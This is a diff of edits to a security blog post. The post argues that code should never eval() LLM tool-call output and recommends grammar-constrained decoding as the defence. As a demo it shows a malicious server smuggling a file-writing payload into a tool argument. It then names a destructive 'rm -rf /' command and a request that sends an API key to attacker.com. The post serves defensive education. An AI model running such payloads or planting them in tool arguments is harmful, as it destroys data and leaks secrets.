@@ -6,7 +6,7 @@
  > 
  > You’ve already handed the attacker the keys.**
 
-Why's that hot take so incendiary? Because the industry continues to treat the Large‑Language Model (LLM) itself as a security layer, then tries to “harden” it with nicer words. 
+Why's that hot take so incendiary? Because the industry continues to treat the Large Language Model (LLM) itself as a security layer, then tries to “harden” it with nicer words. 
 
 Spoiler alert: No amount of prompting, instructions, or training can stop an LLM from being influenced by inputs in a way that can be potentially harmful.
 
@@ -183,7 +183,8 @@ calculation = eval(fc_args["expression"])
 tool_result = {"result": calculation}
 ```
  
- The client then does something nobody saw coming: it runs `eval(fc_args["expression"])`! Why? Because the malicious server stuffed `open('pwned.txt', 'w').write('owned')` into that argument, the client opens a file and writes “owned”.
+ The client then does something nobody saw coming: it runs `eval(fc_args["expression"])`! 
+Why? Because the malicious server stuffed `open('pwned.txt', 'w').write('owned')` into that argument, the client opens a file and writes “owned”.
  
 The first request to the server (without tools) demonstrates that the server will respond with a normal chat message. But as soon as tools are involved, the exploit chain triggers automatically.
 
@@ -191,7 +192,7 @@ The first request to the server (without tools) demonstrates that the server wil
 ---
 ## Why This Is Dangerous
 
-Why should you care about a toy example that writes to a file? Because it illustrates a **general principle**: _LLM outputs should be treated as untrusted user input_. Prompt hardening cannot prevent a determined attacker from steering a stochastic model toward a dangerous token. When your glue code blindly runs whatever the model suggests, be it via `eval()` or an API call, you’ve effectively handed over execution rights.
+Why should you care about a toy example that writes to a file? Because it illustrates a general principle: **LLM outputs should be treated as untrusted user input**. Prompt hardening cannot prevent a determined attacker from steering a stochastic model toward a dangerous token. When your glue code blindly runs whatever the model suggests, be it via `eval()` or an API call, you’ve effectively handed over execution rights.
 
 Consider an attacker who replaces `open('pwned.txt', ...)` with `os.system('rm -rf /')` or `requests.get('https://attacker.com/steal-keys?key=' + secrets.API_KEY)`. The vulnerability scales from file vandalism to full remote code execution (RCE). The language model isn’t at fault; it's a text generator that returned what its prompt told it to return. The insecurity lies in the code that executes the model’s answer without guardrails.
 
@@ -222,27 +223,56 @@ Here’s why it shuts down the attack:
     
 - Because the grammar restricts the language of valid expressions, you can verify the model’s `expression` parameter against the grammar before evaluating it. If it doesn’t match, you refuse to execute or strip invalid characters.
     
-- You can embed this grammar into the model itself using Grammar‑Constrained Decoding (as described in earlier analysis). Rather than asking the model politely to behave, you physically remove the dangerous tokens from its dictionary so they cannot be produced. Your prompt now controls _which_ tokens are possible, not just biases their probability.
+- You can embed this grammar into the model *during* inference using Grammar‑Constrained Decoding (as described in earlier analysis). Rather than asking the model politely to behave, you physically remove the dangerous tokens from its dictionary so they cannot be produced. Your prompt now controls _which_ tokens are possible, not just biases their probability.
 
 In effect, the grammar transforms the free‑form “calculator” into a deterministic parser. When influence ≠ control what mechanism could make it literally impossible for the model to generate `open('pwned.txt', ...)`? **This grammar is that mechanism.** It enforces security at the sampling level, ensuring that both the LLM and your glue code stay within a narrow, controlled language of arithmetic.
 
+---
 ## Takeaways
 
-Garrett helped me realize the harsh truth of AI Security:
+Garrett's demo helped me realize the harsh truth of AI Security:
 
-> The LLM isn’t your problem. It’s not running code. It’s not compiling binaries. It’s generating text. That text gets handed off to another part of your system - a parser, a command interpreter, maybe even a shell wrapper. That’s where the danger is
+> "The LLM isn’t your problem. It’s not running code. It’s not compiling binaries. It’s generating text. That text gets handed off to another part of your system - a parser, a command interpreter, maybe even a shell wrapper. That’s where the danger is."
 
 The example we covered showed that the action layer is your attack surface. Your trust boundary is *after* you parse/validate the output.
 
 [User Input] → [LLM] → [Output] → [Interpreter] → [Real World Effects]
 
+An LLM doesn’t execute code or perform actions – it generates text. **That’s it.** Any real-world impact comes from whatever system consumes and acts on that text.
+In other words, the thing that makes LLMs useful is the ability to call tools && having access to relevant data. 
+
+Guess what happens when you chain these processes together? 
+
+You get an **Agentic Workflow**:
+A system where reasoning loops and tool calls become automated. 
+But they're bound by the same laws: 
+
+**Usefulness comes from structured outputs and tool access.**
+‎ 
+‎ 
+Defensive prompting _asks_ a model to behave. Grammar-Constrained Decoding _forces_ it to.  
+With a formal grammar, the model (or agent) **cannot** hallucinate tools or commands; it’s restricted to a valid set.
+
+The best part? You are not handicapping your LLM.
+Grammar constraints are applied **at inference time**, letting you dynamically adapt behavior without sacrificing capability
+‎ 
+
+---
+
+## Conclusion‎
 
 As Garrett says: **Treat LLM output like garbage. It is.**
 
-- **The threat isn’t the model; it’s the glue:** Your integration code decides whether a model’s suggestion becomes a system call. If you blindly `eval` user‑supplied strings, you’ve already lost. Defensive prompting is a band‑aid, not a solution.
+- **The threat isn’t the model; it’s the glue:** Your integration code decides whether a model’s suggestion becomes a system call. If you blindly `eval()` user‑supplied strings, you’ve already lost. Defensive prompting is a band‑aid, not a solution.
     
 - **Wrap output parser with strict validators:** By defining a strict grammar for tool parameters and parsing inputs against it, you remove entire classes of exploits. Don’t just bias the model away from danger; **make dangerous tokens impossible to generate.**
     
 - **LLM ≠ Trusted Component**: Always treat LLM outputs as untrusted user input. Validate, sanitize, and constrain. Anything less is akin to leaving `eval()` wide open to the internet.
 
 By adopting these principles, you make your AI integrations **incapable** of misbehaving rather than simply *asking* them to behave nicely with defensive prompting. That’s not a hot take—it’s the only sane way to build secure, reliable systems.
+
+###### And an even hotter take?
+
+Prompt Injection shouldn't even be considered a vulnerability. It’s like claiming SQL Injection when you're already inside the SQL command interpreter. 
+
+**That's not injection, that's just using it as expected.**
